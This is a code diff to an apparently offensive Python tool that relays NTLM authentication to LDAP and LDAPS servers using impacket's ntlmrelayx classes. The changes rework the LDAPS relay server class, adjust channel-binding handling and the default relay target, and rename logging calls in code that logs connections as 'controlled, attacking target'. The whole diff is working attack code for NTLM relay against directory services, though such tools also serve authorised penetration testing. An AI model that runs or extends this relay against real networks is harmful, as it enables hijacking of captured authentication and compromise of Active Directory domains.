@@ -6,7 +6,7 @@ from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_A
 from impacket.spnego import SPNEGO_NegTokenInit, TypesMech, SPNEGO_NegTokenResp 
 # for relay used
 from impacket.examples.ntlmrelayx.servers.httprelayserver import HTTPRelayServer
-from impacket.examples.ntlmrelayx.clients.ldaprelayclient import LDAPRelayClient,LDAPSRelayClient
+from impacket.examples.ntlmrelayx.clients.ldaprelayclient import LDAPRelayClient
 from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
 from impacket.ntlm import NTLMAuthChallenge, NTLMSSP_AV_FLAGS, AV_PAIRS, NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SIGN, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMAuthChallengeResponse, NTLMSSP_NEGOTIATE_KEY_EXCH, NTLMSSP_NEGOTIATE_VERSION, NTLMSSP_NEGOTIATE_UNICODE
@@ -382,7 +382,7 @@ class CONNECTION:
                 logging.debug("Server returns invalidCredentials")
                 if 'AcceptSecurityContext error, data 80090346' in str(ldap_session.result):
                     logging.warning("Channel binding is enforced!")
-                    if self.tls_channel_binding_supported:
+                    if self.tls_channel_binding_supported and self.use_ldaps:
                         logging.debug("Re-authenticate with channel binding")
                         return self.init_ldap_connection(target, tls, domain, username, password, lmhash, nthash, tls_channel_binding=True)
                     else:
@@ -803,7 +803,6 @@ class LDAPRelayServer(LDAPRelayClient):
         if result['result'] == RESULT_SUCCESS:
             self.session.bound = True
             self.session.refresh_server_info()
-            
             self.ldap_relay.ldap_server = self.server
             self.ldap_relay.ldap_session = self.session
 
@@ -813,7 +812,10 @@ class LDAPRelayServer(LDAPRelayClient):
                 raise LDAPRelayClientException('Server rejected authentication because LDAP signing is enabled. Try connecting with TLS enabled (specify target as ldaps://hostname )')
         return None, STATUS_ACCESS_DENIED
 
-class LDAPSRelayServer(LDAPSRelayClient):
+class LDAPSRelayServer(LDAPRelayServer):
+    def __init__(self, serverConfig, target, targetPort = 636, extendedSecurity=True ):
+        LDAPRelayClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)
+
     def initConnection(self):
         self.ldap_relay.scheme = "LDAPS"
         self.server = ldap3.Server("ldaps://%s:%s" % (self.targetHost, self.targetPort), get_info=ldap3.ALL)
@@ -877,7 +879,7 @@ class HTTPRelayServer(HTTPRelayServer):
                     target = '%s://%s@%s' % (self.target.scheme, self.authUser.replace("/", '\\'), self.target.netloc)
 
                 if not self.do_ntlm_auth(token, authenticateMessage):
-                    LOG.error("Authenticating against %s://%s as %s FAILED" % (self.target.scheme, self.target.netloc,
+                    logging.error("Authenticating against %s://%s as %s FAILED" % (self.target.scheme, self.target.netloc,
                                                                                self.authUser))
                     if self.server.config.disableMulti:
                         self.send_not_found()
@@ -894,7 +896,7 @@ class HTTPRelayServer(HTTPRelayServer):
                             self.send_not_found()
                             return
 
-                        LOG.info("HTTPD(%s): Connection from %s@%s controlled, attacking target %s://%s" % (self.server.server_address[1],
+                        logging.info("HTTPD(%s): Connection from %s@%s controlled, attacking target %s://%s" % (self.server.server_address[1],
                             self.authUser, self.client_address[0], self.target.scheme, self.target.netloc))
 
                         self.do_REDIRECT()
@@ -905,7 +907,6 @@ class HTTPRelayServer(HTTPRelayServer):
                     # Relay worked, do whatever we want here...
                     logging.info("HTTPD(%s): Authenticating against %s://%s as %s SUCCEED" % (self.server.server_address[1],
                         self.target.scheme, self.target.netloc, self.authUser))
-
                     if self.server.config.disableMulti:
                         # We won't use the redirect trick, closing connection...
                         if self.command == "PROPFIND":
@@ -936,13 +937,13 @@ class HTTPRelayServer(HTTPRelayServer):
                             return
 
                         # We have the next target, let's keep relaying...
-                        LOG.info("HTTPD(%s): Connection from %s@%s controlled, attacking target %s://%s" % (self.server.server_address[1],
+                        logging.info("HTTPD(%s): Connection from %s@%s controlled, attacking target %s://%s" % (self.server.server_address[1],
                             self.authUser, self.client_address[0], self.target.scheme, self.target.netloc))
                         self.do_REDIRECT()
 
 class Relay:
     def __init__(self, target, interface="0.0.0.0", port=80, args=None):
-        self.target = "ldap://%s" % (target)
+        self.target = "ldaps://%s" % (target)
         self.interface = interface
         self.port = port
         self.args = args
@@ -1002,7 +1003,7 @@ class Relay:
         relay_server.ldap_relay = self
         return relay_server
 
-    def get_relay_ldaps_server(self, *args, **kwargs) -> LDAPSRelayClient:
+    def get_relay_ldaps_server(self, *args, **kwargs) -> LDAPRelayClient:
         relay_server = LDAPSRelayServer(*args, **kwargs)
         relay_server.ldap_relay = self
         return relay_server
